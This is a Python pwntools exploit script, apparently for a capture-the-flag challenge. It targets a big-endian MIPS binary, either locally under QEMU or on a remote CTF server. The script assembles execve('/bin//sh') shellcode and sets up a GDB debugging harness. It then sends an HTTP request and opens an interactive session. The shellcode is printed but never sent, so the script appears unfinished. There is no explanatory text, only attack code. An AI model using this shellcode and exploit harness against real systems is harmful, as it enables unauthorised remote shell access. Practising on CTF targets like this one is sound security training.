from pwn import *

context.update(arch='mips', os='linux', bits=32, endian='big')
elfexe = ELF('./binary')
context.binary = elfexe

shellcode = asm('''
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
''')
print(shellcode)

def start(argv=[], *a, **kw):
    if args.GDB:
        target = process(['./qemu-mips', '-L', './', '-g', '12345', './binary'])
        sleep(0.5)
        gdbscript_lines = []
        for line in gdbscript.splitlines():
            if (line := line.strip()):
                gdbscript_lines.append('-ex')
                gdbscript_lines.append(line)
        subprocess.Popen([
            'gnome-terminal',
            '--',
            'gdb-multiarch',
            *gdbscript_lines
        ])
    else:
        # target = process(['./qemu-mips', '-L', './', './binary'])
        target = remote('challenge.ctf.uscybergames.com', '33893')
    return target

arguments = []
gdbscript=''
r = start(arguments, gdbscript)
webrequest = b'''GET /contact HTTP/1.1
Host: example.com
User-Agent: curl/8.6.0
Accept: */*

'''.replace(b'\n', b'\r\n')
r.sendline(webrequest)
r.interactive()

